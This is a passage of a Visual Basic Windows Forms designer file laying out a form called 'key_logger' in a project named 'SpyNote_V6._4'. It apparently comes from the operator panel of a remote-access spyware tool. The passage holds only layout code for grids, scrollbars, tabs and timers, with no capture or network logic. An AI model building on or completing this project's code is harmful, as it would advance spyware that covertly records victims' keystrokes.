        DataGridViewCellStyle1.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        DataGridViewCellStyle1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        DataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        DataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        DataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.[True]
        Me.ViewManager.ColumnHeadersDefaultCellStyle = DataGridViewCellStyle1
        Me.ViewManager.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize
        Me.ViewManager.Columns.AddRange(New System.Windows.Forms.DataGridViewColumn() {Me.Column1, Me.Column2})
        DataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
        DataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        DataGridViewCellStyle2.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        DataGridViewCellStyle2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer))
        DataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        DataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        DataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.[False]
        Me.ViewManager.DefaultCellStyle = DataGridViewCellStyle2
        Me.ViewManager.Dock = System.Windows.Forms.DockStyle.Fill
        Me.ViewManager.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically
        Me.ViewManager.EnableHeadersVisualStyles = False
        Me.ViewManager.GridColor = System.Drawing.Color.FromArgb(CType(CType(63, Byte), Integer), CType(CType(63, Byte), Integer), CType(CType(70, Byte), Integer))
        Me.ViewManager.Location = New System.Drawing.Point(0, 0)
        Me.ViewManager.MultiSelect = False
        Me.ViewManager.Name = "ViewManager"
        Me.ViewManager.RowHeadersVisible = False
        Me.ViewManager.ScrollBars = System.Windows.Forms.ScrollBars.None
        Me.ViewManager.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect
        Me.ViewManager.ShowCellToolTips = False
        Me.ViewManager.Size = New System.Drawing.Size(570, 293)
        Me.ViewManager.TabIndex = 10
        '
        'Column1
        '
        Me.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None
        Me.Column1.HeaderText = ""
        Me.Column1.Name = "Column1"
        Me.Column1.Width = 27
        '
        'Column2
        '
        Me.Column2.HeaderText = "           "
        Me.Column2.Name = "Column2"
        Me.Column2.Resizable = System.Windows.Forms.DataGridViewTriState.[True]
        Me.Column2.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable
        Me.Column2.Width = 45
        '
        'VisualStudioHorizontalScrollBar1
        '
        Me.VisualStudioHorizontalScrollBar1.AmountOfInnerLines = SpyNote_V6._4.SN.VisualStudioHorizontalScrollBar.__InnerLineCount.One
        Me.VisualStudioHorizontalScrollBar1.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar1.BaseColour = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar1.ButtonSize = 16
        Me.VisualStudioHorizontalScrollBar1.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.VisualStudioHorizontalScrollBar1.LargeChange = 10
        Me.VisualStudioHorizontalScrollBar1.Location = New System.Drawing.Point(0, 293)
        Me.VisualStudioHorizontalScrollBar1.Maximum = 1
        Me.VisualStudioHorizontalScrollBar1.Minimum = 0
        Me.VisualStudioHorizontalScrollBar1.Name = "VisualStudioHorizontalScrollBar1"
        Me.VisualStudioHorizontalScrollBar1.OuterBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioHorizontalScrollBar1.ShowOuterBorder = False
        Me.VisualStudioHorizontalScrollBar1.ShowThumbBorder = False
        Me.VisualStudioHorizontalScrollBar1.Size = New System.Drawing.Size(570, 10)
        Me.VisualStudioHorizontalScrollBar1.SmallChange = 10
        Me.VisualStudioHorizontalScrollBar1.TabIndex = 9
        Me.VisualStudioHorizontalScrollBar1.Text = "VisualStudioHorizontalScrollBar1"
        Me.VisualStudioHorizontalScrollBar1.ThumbBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioHorizontalScrollBar1.ThumbHoverColour = System.Drawing.Color.FromArgb(CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer), CType(CType(143, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar1.ThumbNormalColour = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(100, Byte), Integer), CType(CType(103, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar1.ThumbPressedColour = System.Drawing.Color.FromArgb(CType(CType(200, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(203, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar1.Value = 0
        '
        'VisualStudioVerticalScrollBar1
        '
        Me.VisualStudioVerticalScrollBar1.AmountOfInnerLines = SpyNote_V6._4.SN.VisualStudioVerticalScrollBar.__InnerLineCount.One
        Me.VisualStudioVerticalScrollBar1.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.VisualStudioVerticalScrollBar1.BaseColour = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.VisualStudioVerticalScrollBar1.ButtonSize = 16
        Me.VisualStudioVerticalScrollBar1.Dock = System.Windows.Forms.DockStyle.Right
        Me.VisualStudioVerticalScrollBar1.LargeChange = 10
        Me.VisualStudioVerticalScrollBar1.LenColour = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.VisualStudioVerticalScrollBar1.Llen = -1
        Me.VisualStudioVerticalScrollBar1.Location = New System.Drawing.Point(570, 0)
        Me.VisualStudioVerticalScrollBar1.Maximum = 1
        Me.VisualStudioVerticalScrollBar1.Minimum = 0
        Me.VisualStudioVerticalScrollBar1.Name = "VisualStudioVerticalScrollBar1"
        Me.VisualStudioVerticalScrollBar1.OuterBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioVerticalScrollBar1.ShowOuterBorder = False
        Me.VisualStudioVerticalScrollBar1.ShowThumbBorder = False
        Me.VisualStudioVerticalScrollBar1.Size = New System.Drawing.Size(10, 303)
        Me.VisualStudioVerticalScrollBar1.SmallChange = 10
        Me.VisualStudioVerticalScrollBar1.TabIndex = 8
        Me.VisualStudioVerticalScrollBar1.Text = "VisualStudioVerticalScrollBar1"
        Me.VisualStudioVerticalScrollBar1.ThumbBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioVerticalScrollBar1.ThumbHoverColour = System.Drawing.Color.FromArgb(CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer), CType(CType(143, Byte), Integer))
        Me.VisualStudioVerticalScrollBar1.ThumbNormalColour = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(100, Byte), Integer), CType(CType(103, Byte), Integer))
        Me.VisualStudioVerticalScrollBar1.ThumbPressedColour = System.Drawing.Color.FromArgb(CType(CType(200, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(203, Byte), Integer))
        Me.VisualStudioVerticalScrollBar1.Value = 0
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.Panel2)
        Me.TabPage2.Location = New System.Drawing.Point(4, 29)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(586, 309)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Online"
        '
        'Panel2
        '
        Me.Panel2.Controls.Add(Me.DataGridView1)
        Me.Panel2.Controls.Add(Me.VisualStudioHorizontalScrollBar2)
        Me.Panel2.Controls.Add(Me.VisualStudioVerticalScrollBar2)
        Me.Panel2.Dock = System.Windows.Forms.DockStyle.Fill
        Me.Panel2.Location = New System.Drawing.Point(3, 3)
        Me.Panel2.Name = "Panel2"
        Me.Panel2.Size = New System.Drawing.Size(580, 303)
        Me.Panel2.TabIndex = 1
        '
        'DataGridView1
        '
        Me.DataGridView1.AllowUserToAddRows = False
        Me.DataGridView1.AllowUserToDeleteRows = False
        Me.DataGridView1.AllowUserToResizeColumns = False
        Me.DataGridView1.AllowUserToResizeRows = False
        Me.DataGridView1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells
        Me.DataGridView1.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells
        Me.DataGridView1.BackgroundColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.DataGridView1.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.DataGridView1.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None
        Me.DataGridView1.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None
        DataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
        DataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        DataGridViewCellStyle3.Font = New System.Drawing.Font("Arial", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        DataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        DataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        DataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        DataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.[False]
        Me.DataGridView1.ColumnHeadersDefaultCellStyle = DataGridViewCellStyle3
        Me.DataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize
        Me.DataGridView1.Columns.AddRange(New System.Windows.Forms.DataGridViewColumn() {Me.DataGridViewImageColumn1, Me.DataGridViewTextBoxColumn1})
        DataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft
        DataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        DataGridViewCellStyle4.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        DataGridViewCellStyle4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer))
        DataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        DataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.FromArgb(CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer), CType(CType(241, Byte), Integer))
        DataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.[False]
        Me.DataGridView1.DefaultCellStyle = DataGridViewCellStyle4
        Me.DataGridView1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.DataGridView1.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically
        Me.DataGridView1.EnableHeadersVisualStyles = False
        Me.DataGridView1.GridColor = System.Drawing.Color.FromArgb(CType(CType(63, Byte), Integer), CType(CType(63, Byte), Integer), CType(CType(70, Byte), Integer))
        Me.DataGridView1.Location = New System.Drawing.Point(0, 0)
        Me.DataGridView1.MultiSelect = False
        Me.DataGridView1.Name = "DataGridView1"
        Me.DataGridView1.RowHeadersVisible = False
        Me.DataGridView1.ScrollBars = System.Windows.Forms.ScrollBars.None
        Me.DataGridView1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect
        Me.DataGridView1.ShowCellToolTips = False
        Me.DataGridView1.Size = New System.Drawing.Size(570, 293)
        Me.DataGridView1.TabIndex = 10
        '
        'DataGridViewImageColumn1
        '
        Me.DataGridViewImageColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None
        Me.DataGridViewImageColumn1.HeaderText = ""
        Me.DataGridViewImageColumn1.Name = "DataGridViewImageColumn1"
        Me.DataGridViewImageColumn1.Width = 27
        '
        'DataGridViewTextBoxColumn1
        '
        Me.DataGridViewTextBoxColumn1.HeaderText = "           "
        Me.DataGridViewTextBoxColumn1.Name = "DataGridViewTextBoxColumn1"
        Me.DataGridViewTextBoxColumn1.Resizable = System.Windows.Forms.DataGridViewTriState.[True]
        Me.DataGridViewTextBoxColumn1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable
        Me.DataGridViewTextBoxColumn1.Width = 44
        '
        'VisualStudioHorizontalScrollBar2
        '
        Me.VisualStudioHorizontalScrollBar2.AmountOfInnerLines = SpyNote_V6._4.SN.VisualStudioHorizontalScrollBar.__InnerLineCount.One
        Me.VisualStudioHorizontalScrollBar2.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar2.BaseColour = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar2.ButtonSize = 16
        Me.VisualStudioHorizontalScrollBar2.Dock = System.Windows.Forms.DockStyle.Bottom
        Me.VisualStudioHorizontalScrollBar2.LargeChange = 10
        Me.VisualStudioHorizontalScrollBar2.Location = New System.Drawing.Point(0, 293)
        Me.VisualStudioHorizontalScrollBar2.Maximum = 1
        Me.VisualStudioHorizontalScrollBar2.Minimum = 0
        Me.VisualStudioHorizontalScrollBar2.Name = "VisualStudioHorizontalScrollBar2"
        Me.VisualStudioHorizontalScrollBar2.OuterBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioHorizontalScrollBar2.ShowOuterBorder = False
        Me.VisualStudioHorizontalScrollBar2.ShowThumbBorder = False
        Me.VisualStudioHorizontalScrollBar2.Size = New System.Drawing.Size(570, 10)
        Me.VisualStudioHorizontalScrollBar2.SmallChange = 10
        Me.VisualStudioHorizontalScrollBar2.TabIndex = 9
        Me.VisualStudioHorizontalScrollBar2.Text = "VisualStudioHorizontalScrollBar2"
        Me.VisualStudioHorizontalScrollBar2.ThumbBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioHorizontalScrollBar2.ThumbHoverColour = System.Drawing.Color.FromArgb(CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer), CType(CType(143, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar2.ThumbNormalColour = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(100, Byte), Integer), CType(CType(103, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar2.ThumbPressedColour = System.Drawing.Color.FromArgb(CType(CType(200, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(203, Byte), Integer))
        Me.VisualStudioHorizontalScrollBar2.Value = 0
        '
        'VisualStudioVerticalScrollBar2
        '
        Me.VisualStudioVerticalScrollBar2.AmountOfInnerLines = SpyNote_V6._4.SN.VisualStudioVerticalScrollBar.__InnerLineCount.One
        Me.VisualStudioVerticalScrollBar2.BackColor = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.VisualStudioVerticalScrollBar2.BaseColour = System.Drawing.Color.FromArgb(CType(CType(45, Byte), Integer), CType(CType(45, Byte), Integer), CType(CType(48, Byte), Integer))
        Me.VisualStudioVerticalScrollBar2.ButtonSize = 16
        Me.VisualStudioVerticalScrollBar2.Dock = System.Windows.Forms.DockStyle.Right
        Me.VisualStudioVerticalScrollBar2.LargeChange = 10
        Me.VisualStudioVerticalScrollBar2.LenColour = System.Drawing.Color.FromArgb(CType(CType(32, Byte), Integer), CType(CType(146, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.VisualStudioVerticalScrollBar2.Llen = -1
        Me.VisualStudioVerticalScrollBar2.Location = New System.Drawing.Point(570, 0)
        Me.VisualStudioVerticalScrollBar2.Maximum = 1
        Me.VisualStudioVerticalScrollBar2.Minimum = 0
        Me.VisualStudioVerticalScrollBar2.Name = "VisualStudioVerticalScrollBar2"
        Me.VisualStudioVerticalScrollBar2.OuterBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioVerticalScrollBar2.ShowOuterBorder = False
        Me.VisualStudioVerticalScrollBar2.ShowThumbBorder = False
        Me.VisualStudioVerticalScrollBar2.Size = New System.Drawing.Size(10, 303)
        Me.VisualStudioVerticalScrollBar2.SmallChange = 10
        Me.VisualStudioVerticalScrollBar2.TabIndex = 8
        Me.VisualStudioVerticalScrollBar2.Text = "VisualStudioVerticalScrollBar2"
        Me.VisualStudioVerticalScrollBar2.ThumbBorderColour = System.Drawing.Color.Empty
        Me.VisualStudioVerticalScrollBar2.ThumbHoverColour = System.Drawing.Color.FromArgb(CType(CType(140, Byte), Integer), CType(CType(140, Byte), Integer), CType(CType(143, Byte), Integer))
        Me.VisualStudioVerticalScrollBar2.ThumbNormalColour = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(100, Byte), Integer), CType(CType(103, Byte), Integer))
        Me.VisualStudioVerticalScrollBar2.ThumbPressedColour = System.Drawing.Color.FromArgb(CType(CType(200, Byte), Integer), CType(CType(200, Byte), Integer), CType(CType(203, Byte), Integer))
        Me.VisualStudioVerticalScrollBar2.Value = 0
        '
        'TScrolls
        '
        Me.TScrolls.Interval = 1
        '
        'TProgressBar
        '
        Me.TProgressBar.Interval = 1
        '
        'Trans
        '
        Me.Trans.Interval = 40
        '
        'SELCT_LOG
        '
        Me.SELCT_LOG.AutoSize = False
        Me.SELCT_LOG.Name = "SELCT_LOG"
        Me.SELCT_LOG.ShowImageMargin = False
        Me.SELCT_LOG.Size = New System.Drawing.Size(153, 26)
        '
        'key_logger
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(594, 423)
        Me.Controls.Add(Me.ThemeTabControl1)
        Me.Controls.Add(Me.Panel1)
        Me.Controls.Add(Me.PNLERRORS)
        Me.Controls.Add(Me.ProgressBar1)
        Me.Controls.Add(Me.BOXDOWN)
        Me.ForeColor = System.Drawing.Color.FromArgb(CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer), CType(CType(170, Byte), Integer))
        Me.MinimumSize = New System.Drawing.Size(610, 447)
        Me.Name = "key_logger"
        Me.Opacity = 0R
        Me.Text = "key_logger"
        CType(Me.BOXDOWN, System.ComponentModel.ISupportInitialize).EndInit()
        Me.PNLERRORS.ResumeLayout(False)
        Me.PNLERRORS.PerformLayout()
        Me.Panel1.ResumeLayout(False)
        Me.SplitContainer1.Panel1.ResumeLayout(False)
        Me.SplitContainer1.Panel1.PerformLayout()
        Me.SplitContainer1.Panel2.ResumeLayout(False)
        CType(Me.SplitContainer1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.SplitContainer1.ResumeLayout(False)
        CType(Me.SLLOG, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ThemeTabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.PINFO.ResumeLayout(False)
        CType(Me.PCNOTF, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.ViewManager, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage2.ResumeLayout(False)
        Me.Panel2.ResumeLayout(False)
        CType(Me.DataGridView1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)

    End Sub

    Friend WithEvents BOXDOWN As PictureBox
    Friend WithEvents ProgressBar1 As SN.ThemeProgressBar
    Friend WithEvents PNLERRORS As Panel
    Friend WithEvents LBER As Label
    Friend WithEvents Panel1 As Panel
    Friend WithEvents SplitContainer1 As SplitContainer
    Friend WithEvents SLLOG As SN.ThemeCoBox
    Friend WithEvents Label1 As Label
    Friend WithEvents ThemeButton1 As SN.ThemeButton
    Friend WithEvents ThemeButton2 As SN.ThemeButton
    Friend WithEvents ThemeButton4 As SN.ThemeButton
    Friend WithEvents ThemeButton3 As SN.ThemeButton
    Friend WithEvents ThemeTabControl1 As SN.ThemeTabControl
    Friend WithEvents TabPage1 As TabPage
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents PINFO As Panel
    Friend WithEvents VisualStudioVerticalScrollBar1 As SN.VisualStudioVerticalScrollBar
    Friend WithEvents VisualStudioHorizontalScrollBar1 As SN.VisualStudioHorizontalScrollBar
    Friend WithEvents PCNOTF As PictureBox
    Friend WithEvents ViewManager As DataGridView
    Friend WithEvents Column1 As DataGridViewImageColumn
    Friend WithEvents Column2 As DataGridViewTextBoxColumn
    Friend WithEvents Panel2 As Panel
    Friend WithEvents DataGridView1 As DataGridView
    Friend WithEvents DataGridViewImageColumn1 As DataGridViewImageColumn
    Friend WithEvents DataGridViewTextBoxColumn1 As DataGridViewTextBoxColumn
    Friend WithEvents VisualStudioHorizontalScrollBar2 As SN.VisualStudioHorizontalScrollBar
    Friend WithEvents VisualStudioVerticalScrollBar2 As SN.VisualStudioVerticalScrollBar
    Friend WithEvents TScrolls As Timer
    Friend WithEvents TProgressBar As Timer
    Friend WithEvents Trans As Timer
    Friend WithEvents SELCT_LOG As ContextMenuStrip
End Class
